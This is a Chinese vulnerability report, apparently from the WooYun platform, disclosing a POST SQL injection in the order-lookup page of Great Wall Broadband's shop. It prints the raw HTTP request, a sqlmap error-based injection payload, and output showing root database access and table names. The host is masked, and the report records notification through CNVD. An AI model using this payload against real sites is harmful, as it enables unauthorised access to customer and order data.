wybug_title: 宽带安全之长城宽带商城post注入漏洞（root权限/含order和user表）
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-09-12：	细节已通知厂商并且等待厂商处理中									2015-09-14：	cncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开									2015-09-24：	细节向核心白帽子及相关领域专家公开									2015-10-04：	细节向普通白帽子公开									2015-10-14：	细节向实习白帽子公开									2015-10-29：	细节向公众公开  简要描述： 2333333 详细说明：  1、订单查询处有注入http://**.**.**.**/member/ckOrderInfo.action2、post包
POST /member/ckOrderInfo.action HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://**.**.**.**/member/ckOrderInfo.actionCookie: JSESSIONID=4C19D49E29EEBE2336574D8A27880D32.momoko1; CNZZDATA1253102899=900516791-1441867246-http%253A%252F%252F**.**.**.**%252F%7C1441867246; goodsView="103,103,100"Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 100memberId=445&loginId=abc888999&orderNo=1&ctx=&basePath=http%3A%2F%2F**.**.**.**%3A80&pageNo=1
3、数据root权限
Place: POSTParameter: orderNo    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: memberId=445&loginId=abc888999&orderNo=1' AND (SELECT 9583 FROM(SELECT COUNT(*),CONCAT(0x3a6c70623a,(SELECT (CASE WHEN (9583=9583) THEN 1 ELSE 0 END)),0x3a7577683a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'fcRJ'='fcRJ&ctx=&basePath=http://**.**.**.**:80&pageNo=1---[14:51:07] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.2.19back-end DBMS: MySQL 5.0[14:51:07] [INFO] fetching current user[14:51:08] [INFO] retrieved: root@%current user:    'root@%'
5个数据库121个表
available databases [5]:[*] information_schema[*] momoko3[*] mysql[*] performance_schema[*] test
敏感的不贴
Database: performance_schema[17 tables]

Database: momoko3[43 tables]

Database: information_schema[37 tables]

Database: mysql[24 tables]
含order、user、master、columns等敏感表段





   漏洞证明：  1、订单查询处有注入http://**.**.**.**/member/ckOrderInfo.action2、post包
POST /member/ckOrderInfo.action HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://**.**.**.**/member/ckOrderInfo.actionCookie: JSESSIONID=4C19D49E29EEBE2336574D8A27880D32.momoko1; CNZZDATA1253102899=900516791-1441867246-http%253A%252F%252F**.**.**.**%252F%7C1441867246; goodsView="103,103,100"Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 100memberId=445&loginId=abc888999&orderNo=1&ctx=&basePath=http%3A%2F%2F**.**.**.**%3A80&pageNo=1

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-09-14 23:14 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向网站管理单位通报。 最新状态： 暂无
